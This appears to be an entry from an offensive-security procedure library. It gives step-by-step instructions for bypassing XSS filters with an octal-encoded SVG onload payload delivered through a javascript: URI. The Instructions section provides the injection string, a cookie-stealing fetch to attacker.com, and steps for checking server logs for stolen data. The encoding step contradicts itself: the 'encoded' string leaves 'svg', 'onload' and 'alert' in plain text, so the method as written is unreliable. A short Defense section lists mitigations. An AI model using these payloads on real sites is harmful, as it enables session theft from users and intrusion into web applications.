---
type: procedure
description: >-
  Bypass XSS input filters using octal encoding on a JavaScript payload
  delivered via an SVG element to execute arbitrary code in the victim's
  browser.
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - filter-bypass
  - octal-encoding
  - svg-payload
commands: []
tools: []
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Octal-Encoded-JavaScript-SVG-XSS-Filter-Bypass

## Summary

This procedure outlines a technique to bypass Cross-Site Scripting (XSS) filters by encoding a malicious JavaScript payload in octal format and delivering it via an SVG element. Octal encoding uses JavaScript escape sequences (e.g., \141 for 'a') to represent characters, evading filters that only scan for plain ASCII or common encodings. The payload executes when the SVG loads, enabling actions like alerting for proof-of-concept or stealing cookies for data exfiltration. This is effective against web applications with incomplete input sanitization.

## Description

XSS vulnerabilities allow attackers to inject and execute malicious scripts in users' browsers. Many filters block direct <script> tags or common payloads but fail to decode octal escapes in JavaScript strings. This procedure crafts an SVG element with an onload attribute containing octal-encoded JavaScript, wrapped in a javascript: URI scheme for injection into reflected or stored XSS contexts, such as search fields, comments, or URL parameters. The target environment is typically a web application running on any browser-supporting SVG (modern browsers). Expected outcomes include arbitrary JS execution, such as document.cookie theft sent to an attacker-controlled server. Prerequisites include identifying a reflection point where user input is rendered without proper escaping.

## Requirements

1. A vulnerable web application with an XSS entry point (e.g., reflected input in a search box) that filters common payloads but does not decode octal escapes.
2. Knowledge of the target's input context (e.g., HTML attribute or text node) to craft the appropriate URI scheme.
3. Access to inject the payload, such as through a form submission or URL manipulation.
4. Optional: A server to receive exfiltrated data (e.g., for cookie theft).

## Defense

- Implement comprehensive input validation that normalizes and decodes all encodings (octal, hex, Unicode) before filtering.
- Use Content Security Policy (CSP) with 'unsafe-inline' restrictions and script-src 'self' to block inline JavaScript execution.
- Employ Web Application Firewalls (WAFs) trained on encoded payloads and SVG-specific attacks.
- Sanitize SVG inputs by disallowing scriptable elements (e.g., onload) or stripping JavaScript URIs.
- Enable browser security features like XSS Auditor (deprecated but similar in modern CSP) and educate developers on secure coding practices.

## Objectives

1. Evade XSS filters by using octal encoding to hide the malicious payload from detection.
2. Execute JavaScript in the victim's browser via an SVG onload event to demonstrate compromise or exfiltrate data.
3. Validate success through visual indicators (e.g., alert popup) or network requests to attacker endpoints.

## Instructions

### Step 1: Craft the Base JavaScript SVG Payload

**Context**: Start with a simple SVG-based payload that executes JavaScript on load. This serves as the foundation before encoding. Reference the base payload code for the unencoded version.

**Code Reference** ([[codes/Simple-SVG-JS-XSS-Payload]]):

The base payload is a javascript: URI containing an SVG element with an onload alert.

**Explanation**: This payload will be encoded in the next step. Test it in a non-filtered environment first to ensure SVG execution works in the target browser.

### Step 2: Encode the Payload in Octal

**Context**: Convert the SVG string to octal escapes to bypass filters. In JavaScript, octal encoding uses \ followed by three digits (000-377) for each character's ASCII value (e.g., '<' is 60 decimal, or \074 in octal). This step hides the payload from regex-based filters looking for '<svg' or 'alert'.

**Manual Encoding Process**:

1. Identify the string to encode: '<svg onload=alert(1)>'
2. Convert each character to octal:
   - '<' → \074
   - 's' → \163
   - 'v' → \166
   - 'g' → \147
   - ' ' → \040
   - 'o' → \157
   - 'n' → \156
   - 'l' → \154
   - 'o' → \157
   - 'a' → \141
   - 'd' → \144
   - '=' → \075
   - 'a' → \141
   - 'l' → \154
   - 'e' → \145
   - 'r' → \162
   - 't' → \164
   - '(' → \050
   - '1' → \061
   - ')' → \051
   - '>' → \076
3. Construct the encoded string: "\074svg onload\075alert\050\061\051\076"
4. Wrap in the javascript: URI: javascript:'\074svg onload\075alert\050\061\051\076'

**Explanation**: Use an online octal converter or JavaScript console (e.g., String.fromCharCode with octal) for accuracy. This encoded version appears as numbers to filters but decodes to valid JS in the browser.

### Step 3: Inject and Test the Encoded Payload

**Context**: Deliver the octal-encoded payload into the vulnerable input field. Use a javascript: URI to force execution when the input is reflected.

**Injection Example**:

Submit the following in the vulnerable field (e.g., search parameter):

javascript:'\074svg onload\075alert\050\061\051\076'

**Explanation**: If the app reflects the input unsanitized, the browser interprets the URI, loads the SVG, and triggers the onload alert. For data exfiltration, replace alert(1) with alert(document.cookie) or a fetch to your server (e.g., fetch('http://attacker.com?cookie='+document.cookie)).

**Decision Point**: If the filter blocks javascript:, try embedding in an <img src> or other tag if the context allows; otherwise, adjust encoding density.

### Step 4: Verify Execution and Exfiltration

**Context**: Confirm the bypass worked and monitor for data theft.

**Verification**:

- Observe an alert popup with '1' (or cookie contents).
- Check browser dev tools for JS execution in the SVG context.
- If exfiltrating, monitor your server logs for incoming requests with stolen data.

**Explanation**: Success means the filter was bypassed, and JS ran client-side. Iterate encodings if partially blocked (e.g., add more escapes for spaces).
